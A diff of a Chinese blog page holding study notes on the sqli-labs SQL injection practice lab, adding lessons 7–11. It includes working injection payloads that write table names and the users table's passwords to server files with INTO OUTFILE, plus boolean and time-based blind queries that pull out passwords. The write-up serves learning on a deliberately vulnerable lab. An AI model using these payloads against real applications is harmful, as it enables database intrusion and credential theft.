@@ -20,13 +20,13 @@ ga('send', 'pageview');
   
   <title>sqli-labs | FINSENTY54</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;">
+  <meta name="description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
 <meta name="keywords" content="sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqli-labs">
 <meta property="og:url" content="http://finsenty54.github.io/2019/02/27/sqli-labs/index.html">
 <meta property="og:site_name" content="FINSENTY54">
-<meta property="og:description" content="Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;">
+<meta property="og:description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/k7xiTg.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/k7zDbT.png">
@@ -37,10 +37,13 @@ ga('send', 'pageview');
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/01/kbMSh9.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/01/kbQiCj.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/03/03/kLirA1.png">
-<meta property="og:updated_time" content="2019-03-03T03:49:35.915Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXV2Tg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXVb0U.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/04/kXZS6x.png">
+<meta property="og:updated_time" content="2019-03-06T12:29:40.754Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
-<meta name="twitter:description" content="Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;">
+<meta name="twitter:description" content="闭合有&amp;#39; &amp;quot; ) 单双引号不能同时存在，) 可有多个 Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;">
 <meta name="twitter:image" content="https://s2.ax1x.com/2019/02/28/k7xiTg.png">
 <meta name="twitter:creator" content="@fin12138">
   
@@ -115,7 +118,9 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote>
+        <hr>
+<p><strong>闭合有<code>&#39;</code> <code>&quot;</code> <code>)</code> 单双引号不能同时存在，<code>)</code> 可有多个</strong></p>
+<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote>
 <p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p>
 </blockquote>
 <p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p>
@@ -171,6 +176,47 @@ ga('send', 'pageview');
 <p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
 <p>更新于2019-03-03 11:48:51 星期日</p>
 <hr>
+<h2 id="Lss-7"><a href="#Lss-7" class="headerlink" title="Lss-7"></a>Lss-7</h2><h5 id="利用outfile文件"><a href="#利用outfile文件" class="headerlink" title="利用outfile文件"></a>利用outfile文件</h5><p><em>一般在Sql查询语句中，想要正常查询到信息，只能在最里层有引号，外层全是小括号。即已知注入类型后依次增加括号数必能分析出括号数（存在注入点）。<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>需要在指定的目录下进行数据的导出。<br>需要注意的是利用数据库file权限向操作系统写入文件时， 对于相同文件名的文件不能覆盖</em></p>
+<p><em>secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行load data、into outfile语句和load_file()函数,这些操作需要用户具有file权限。</em></p>
+<ol>
+<li>如果这个参数为空，这个变量没有效果。</li>
+<li>如果这个参数设为一个目录名，Mysql服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它.</li>
+<li>如果这个参数为null，Mysql服务会禁止导入和导出操作。这个参数在MySQL 5.7.6版本引入。</li>
+</ol>
+<p><em>@@datadir 读取数据库路径<br>@@basedir MYSQL 获取安装路径</em></p>
+<p><em>在Mysql中，需要注意路径转义的问题，即用\分隔。</em></p>
+<p><strong><a href="https://www.jianshu.com/p/7b9256de20d1" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1</a></strong></p>
+<p>经过测试，用<code>&#39;))</code> 来闭合</p>
+<p><code>?id=1&#39;)) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile &quot;C:\\xampp\\mysql\\data\\security\\4.txt&quot; --+</code></p>
+<p><a href="https://imgchr.com/i/kXV2Tg" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXV2Tg.png" alt="kXV2Tg.png"></a></p>
+<p><code>?id=1&#39;)) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;) into outfile &quot;C:\\xampp\\mysql\\data\\security\\5.txt&quot; --+</code></p>
+<p><a href="https://imgchr.com/i/kXVb0U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXVb0U.png" alt="kXVb0U.png"></a></p>
+<p><code>?id=1&#39;)) union select 1,2,(select group_concat(password) from users) into outfile &quot;C:\\xampp\\mysql\\data\\security\\6.txt&quot; --+</code></p>
+<p><a href="https://imgchr.com/i/kXZS6x" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/04/kXZS6x.png" alt="kXZS6x.png"></a></p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><h5 id="盲注布尔注入"><a href="#盲注布尔注入" class="headerlink" title="盲注布尔注入"></a>盲注布尔注入</h5><p><em>当一个页面，存在注入，没显示位，没有数据库出错信息，只能通过页面返回正常不正常进行判断进行sql注入。</em></p>
+<ol>
+<li>exists（）<br>用于检查  子查询是否有返回数据。 结果是 ture或者false</li>
+<li>ascii（）<br>把字符转化成ascii码</li>
+<li>substr（）<br>substr（string string，num start，num length）；<br>偏移从1开始的 并不是0；</li>
+</ol>
+<p><em>DISTINCT 去重复</em><br><code>?id=1&#39; and (select ascii(substr( (select database()) ,1,1))&gt;115) --+</code></p>
+<p><code>?id=1&#39; and ((select count(distinct+table_schema) from information_schema.tables)&gt;6)--+</code></p>
+<p><code>?id=1&#39; and (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101)--+</code></p>
+<p><code>?id=1&#39; and (select ascii(substr( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 0,1) ,1,1))&gt;11) --+</code></p>
+<p><code>?id=1&#39; and (select ascii(substr( (select password from users limit 0,1) ,1,1))&gt;68) --+</code></p>
+<p><em>select database() 作为一个语句加括号</em><br>用脚本来跑</p>
+<p>更新于2019-03-04 23:09:10 星期一</p>
+<hr>
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><h5 id="盲注基于时间"><a href="#盲注基于时间" class="headerlink" title="盲注基于时间"></a>盲注基于时间</h5><p><em>if( expr1 , expr2 , expr3 ) expr1 true 返回expr2 false 返回 expr3</em></p>
+<p><code>?id=1&#39; and if((select ascii(substr(database(),1,1)))=115,sleep(5),1) --+</code></p>
+<p>利用页面返回时间判断对错<br>例如<br><code>?id=1&#39; and if((select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101,sleep(5),1) --+</code></p>
+<hr>
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>与上题相同，不过利用<code>&quot;</code>进行闭合</p>
+<hr>
+<h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><pre><code>GET - 从指定的资源请求数据。
+POST - 向指定的资源提交要被处理的数据
+</code></pre><p>更新于2019-03-06 20:29:31 星期三</p>
+<hr>
 
       
     </div>
@@ -178,7 +224,7 @@ ga('send', 'pageview');
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjssdnage0001lsw8ceh0oku0" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsx6jnqy0004c8w872aqduob" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
